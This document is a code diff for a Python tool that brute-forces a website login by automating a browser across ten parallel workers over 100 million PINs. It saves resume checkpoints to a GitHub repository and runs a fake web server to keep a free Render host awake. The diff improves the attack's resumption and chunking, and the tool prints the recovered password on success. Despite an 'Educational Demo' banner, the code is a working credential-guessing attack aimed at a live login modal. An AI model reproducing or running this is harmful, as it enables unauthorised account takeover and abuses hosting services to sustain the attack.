@@ -27,11 +27,11 @@ NUM_WORKERS       = 10
 DELAY             = 0.3
 HEADLESS          = True
 TOTAL_PINS        = 100_000_000
+PIN_DIGITS        = len(str(TOTAL_PINS - 1))   # auto: 8
 SAVE_EVERY        = 50
-
-SUCCESS_BY_URL     = False
+SUCCESS_BY_URL    = False
 SUCCESS_BY_KEYWORD = True
-SUCCESS_KEYWORD    = os.environ.get("SUCCESS_KEYWORD", "logout")
+SUCCESS_KEYWORD   = os.environ.get("SUCCESS_KEYWORD", "logout")
 
 # ── Selectors ─────────────────────────────────────────────────
 OPEN_MODAL_SELECTOR = "a[onclick*='openLoginPage(5)']"
@@ -44,36 +44,54 @@ found_result = {}
 print_lock   = threading.Lock()
 
 
+# ── PIN formatter ─────────────────────────────────────────────
+def fmt(n: int) -> str:
+    return str(n).zfill(PIN_DIGITS)
+
+
+# ── Chunk splitter (remainder-safe) ───────────────────────────
+def split_chunks(total: int, n: int):
+    size   = total // n
+    rem    = total % n
+    chunks = []
+    start  = 0
+    for i in range(n):
+        end = start + size + (1 if i < rem else 0)
+        chunks.append((start, end))
+        start = end
+    return chunks
+
+
 # ── Fake web server (keeps Render free tier awake) ────────────
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        status = "running"
-        if "pin" in found_result:
-            status = f"FOUND: {found_result['pin']}"
+        status = "FOUND: " + found_result["pin"] if "pin" in found_result else "running"
         self.send_response(200)
         self.end_headers()
         self.wfile.write(status.encode())
 
     def log_message(self, *args):
-        pass  # suppress server logs
+        pass
 
 def start_web_server():
     port = int(os.environ.get("PORT", 8080))
-    server = HTTPServer(("0.0.0.0", port), Handler)
-    server.serve_forever()
+    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
 
 
 # ── GitHub helpers ────────────────────────────────────────────
 def gh_headers():
     return {
         "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept":        "application/vnd.github.v3+json"
+        "Accept":        "application/vnd.github.v3+json",
     }
 
-def github_load_checkpoint():
+def github_load_all_checkpoints():
+    """
+    Load per-worker checkpoints from GitHub.
+    Returns dict: { worker_id(int): last_pin_int } and the file sha.
+    """
     if not GITHUB_TOKEN:
-        print("  [GitHub] No token — starting from 0000.")
-        return 0, None
+        return {}, None
     try:
         url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
         r   = req_lib.get(url, headers=gh_headers(), timeout=10)
@@ -81,44 +99,49 @@ def github_load_checkpoint():
             data    = r.json()
             content = json.loads(base64.b64decode(data["content"]).decode())
             sha     = data["sha"]
-            resume  = int(content["last_pin"]) + 1
-            print(f"  [GitHub] Checkpoint found → resuming from PIN {resume:04d}")
-            return resume, sha
+            workers = content.get("workers", {})
+            # keys stored as strings in JSON, convert to int
+            result  = {int(k): int(v) for k, v in workers.items()}
+            print(f"  [GitHub] Checkpoint loaded: {result}")
+            return result, sha
         elif r.status_code == 404:
-            print("  [GitHub] No checkpoint yet → starting from 0000.")
+            print("  [GitHub] No checkpoint yet — starting fresh.")
         else:
             print(f"  [GitHub] Load failed: {r.status_code}")
     except Exception as e:
         print(f"  [GitHub] Load error: {e}")
-    return 0, None
+    return {}, None
 
-def github_save_checkpoint(pin_int, sha=None):
+# Global checkpoint store (loaded once in run(), shared across workers)
+_gh_checkpoints: dict = {}
+_gh_sha_lock = threading.Lock()
+_gh_sha: str | None  = None
+
+def github_save_checkpoint(worker_id: int, pin_int: int):
+    global _gh_sha, _gh_checkpoints
     if not GITHUB_TOKEN:
-        return sha
-    try:
-        content = base64.b64encode(json.dumps({
-            "last_pin":  pin_int,
-            "timestamp": datetime.now().isoformat(),
-            "username":  USERNAME,
-            "target":    TARGET_URL,
-        }).encode()).decode()
-        payload = {
-            "message": f"checkpoint {pin_int:04d}",
-            "content": content,
-        }
-        if sha:
-            payload["sha"] = sha
-        url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
-        r   = req_lib.put(url, headers=gh_headers(), json=payload, timeout=10)
-        if r.status_code in (200, 201):
-            return r.json()["content"]["sha"]
-        else:
-            print(f"\n  [GitHub] Save failed: {r.status_code}")
-    except Exception as e:
-        print(f"\n  [GitHub] Save error: {e}")
-    return sha
+        return
+    with _gh_sha_lock:
+        _gh_checkpoints[worker_id] = pin_int
+        try:
+            content = base64.b64encode(json.dumps({
+                "workers":   {str(k): v for k, v in _gh_checkpoints.items()},
+                "timestamp": datetime.now().isoformat(),
+                "target":    TARGET_URL,
+            }).encode()).decode()
+            payload = {"message": f"checkpoint w{worker_id}={fmt(pin_int)}", "content": content}
+            if _gh_sha:
+                payload["sha"] = _gh_sha
+            url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
+            r   = req_lib.put(url, headers=gh_headers(), json=payload, timeout=10)
+            if r.status_code in (200, 201):
+                _gh_sha = r.json()["content"]["sha"]
+            else:
+                print(f"\n  [GitHub] Save failed: {r.status_code}")
+        except Exception as e:
+            print(f"\n  [GitHub] Save error: {e}")
 
-def github_save_result(pin, sha=None):
+def github_save_result(pin: str):
     if not GITHUB_TOKEN:
         return
     try:
@@ -135,7 +158,7 @@ def github_save_result(pin, sha=None):
         if check.status_code == 200:
             body["sha"] = check.json()["sha"]
         req_lib.put(url, headers=gh_headers(), json=body, timeout=10)
-        print("\n  [GitHub] result.json saved to repo ✓")
+        print("\n  [GitHub] result.json saved ✓")
     except Exception as e:
         print(f"\n  [GitHub] Result error: {e}")
 
@@ -194,11 +217,18 @@ def open_modal(page, worker_id: int) -> bool:
 
 # ── Worker ────────────────────────────────────────────────────
 def worker(worker_id: int, chunk_start: int, chunk_end: int):
-    start_from, sha = github_load_checkpoint()
+    # Each worker resumes from its OWN saved checkpoint, not a global one
+    saved      = _gh_checkpoints.get(worker_id)
+    start_from = (saved + 1) if saved is not None else chunk_start
+
     if start_from >= chunk_end:
         with print_lock:
-            print(f"  [W{worker_id}] Already done, skipping.")
+            print(f"  [W{worker_id}] Already completed {fmt(chunk_start)}–{fmt(chunk_end-1)}, skipping.")
         return None
+
+    with print_lock:
+        print(f"  [W{worker_id}] Range {fmt(chunk_start)}–{fmt(chunk_end-1)} | "
+              f"Resuming from {fmt(start_from)}")
 
     with sync_playwright() as p:
         browser = p.chromium.launch(headless=HEADLESS, slow_mo=0)
@@ -212,11 +242,9 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
             browser.close()
             return None
 
-        with print_lock:
-            print(f"  [W{worker_id}] Page loaded. Starting...")
-
-        attempts = 0
-        last_pin = start_from
+        attempts   = 0
+        last_pin   = start_from
+        chunk_size = chunk_end - chunk_start
 
         try:
             for pin_int in range(start_from, chunk_end):
@@ -227,18 +255,20 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
                         print(f"\n  [W{worker_id}] Browser closed, stopping.")
                     break
 
-                pin      = f"{pin_int:04d}"
+                pin      = fmt(pin_int)
                 attempts += 1
                 last_pin  = pin_int
 
-                # Save checkpoint every 50 pins
                 if attempts % SAVE_EVERY == 0:
-                    sha = github_save_checkpoint(pin_int, sha)
+                    github_save_checkpoint(worker_id, pin_int)
+
+                progress = pin_int - chunk_start + 1
+                pct      = progress / chunk_size * 100
 
                 with print_lock:
                     print(
                         f"  [W{worker_id}] PIN {pin}  "
-                        f"({pin_int - chunk_start + 1}/{chunk_end - chunk_start})",
+                        f"({progress}/{chunk_size}  {pct:.2f}%)",
                         end="\r"
                     )
 
@@ -260,8 +290,8 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
                         found_event.set()
                         found_result["pin"]       = pin
                         found_result["worker_id"] = worker_id
-                        sha = github_save_checkpoint(pin_int, sha)
-                        github_save_result(pin, sha)
+                        github_save_checkpoint(worker_id, pin_int)
+                        github_save_result(pin)
                         with print_lock:
                             print(f"\n\n  [W{worker_id}] ✓ FOUND! PIN = {pin}")
                         browser.close()
@@ -287,9 +317,9 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
                     time.sleep(DELAY)
 
         except KeyboardInterrupt:
-            sha = github_save_checkpoint(last_pin, sha)
+            github_save_checkpoint(worker_id, last_pin)
             with print_lock:
-                print(f"\n  [W{worker_id}] Saved at {last_pin:04d}")
+                print(f"\n  [W{worker_id}] Saved at {fmt(last_pin)}")
 
         finally:
             try:
@@ -301,27 +331,36 @@ def worker(worker_id: int, chunk_start: int, chunk_end: int):
 
 
 # ── Main ──────────────────────────────────────────────────────
-def split_chunks(total, n):
-    size = total // n
-    return [(i * size, (i + 1) * size if i < n - 1 else total) for i in range(n)]
-
 def run():
+    global _gh_checkpoints, _gh_sha
+
     print()
-    print("=" * 58)
-    print("  BRUTE FORCE — GitHub Checkpoint")
-    print("=" * 58)
+    print("=" * 62)
+    print("  BRUTE FORCE — GitHub Checkpoint  (Educational Demo)")
+    print("=" * 62)
     print(f"  Target   : {TARGET_URL}")
     print(f"  Username : {USERNAME}")
-    print(f"  Range    : 0000 – {TOTAL_PINS-1:04d}")
+    print(f"  Workers  : {NUM_WORKERS}")
+    print(f"  PIN range: {fmt(0)} – {fmt(TOTAL_PINS - 1)}")
+    print(f"  Digits   : {PIN_DIGITS}")
     print(f"  Headless : {HEADLESS}")
     print(f"  Started  : {datetime.now().strftime('%H:%M:%S')}")
-    print("=" * 58)
+    print("=" * 62)
 
-    # Start fake web server for Render free tier
+    # Load all per-worker checkpoints once at startup
+    _gh_checkpoints, _gh_sha = github_load_all_checkpoints()
+
+    # Start keepalive server
     threading.Thread(target=start_web_server, daemon=True).start()
-    print("  [Web] Server started (Render keepalive)")
+    print("  [Web] Keepalive server started")
 
     chunks = split_chunks(TOTAL_PINS, NUM_WORKERS)
+    print("\n  Chunk assignments:")
+    for i, (s, e) in enumerate(chunks, 1):
+        saved = _gh_checkpoints.get(i)
+        note  = f"  ← resume from {fmt(saved + 1)}" if saved is not None else ""
+        print(f"    Worker {i}: {fmt(s)} – {fmt(e-1)}  ({e-s:,} PINs){note}")
+    print()
 
     start_ts = time.time()
     try:
@@ -339,12 +378,12 @@ def run():
 
     elapsed = time.time() - start_ts
     if "pin" in found_result:
-        print(f"\n{'='*58}")
+        print(f"\n{'='*62}")
         print(f"  PASSWORD FOUND!")
         print(f"  Username : {USERNAME}")
         print(f"  Password : {found_result['pin']}")
         print(f"  Time     : {elapsed:.1f}s")
-        print(f"{'='*58}\n")
+        print(f"{'='*62}\n")
     else:
         print(f"\n  Not found. Checkpoint saved — redeploy to continue.")
     print(f"  Total time : {elapsed:.1f}s\n")
